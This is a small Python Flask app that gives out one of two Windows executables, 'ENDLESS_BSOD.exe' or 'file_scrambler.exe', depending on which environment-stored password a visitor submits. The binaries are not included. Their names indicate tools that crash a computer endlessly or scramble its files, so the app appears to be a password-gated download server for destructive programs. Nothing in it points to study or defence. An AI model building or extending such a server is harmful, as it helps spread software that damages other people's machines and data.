from flask import Flask, render_template, request, send_from_directory
import os

app = Flask(__name__)

BSOD_password = os.environ.get("BSOD_password")
FileScrambler_password = os.environ.get("FileScrambler_password")

ENDLESS_BSOD_path = os.path.join("..", "ENDLESS_BSOD", "dist")
FileScrambler_path = os.path.join("..", "FileScrambler", "dist")


@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        user_password = request.form.get("password")

        if user_password == BSOD_password:
            return send_from_directory(
                ENDLESS_BSOD_path,
                "ENDLESS_BSOD.exe",
                as_attachment=True
            )

        if user_password == FileScrambler_password:
            return send_from_directory(
                FileScrambler_path,
                "file_scrambler.exe",
                as_attachment=True
            )

    return render_template("index.html")


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=int(os.environ.get("PORT", 5000))
    )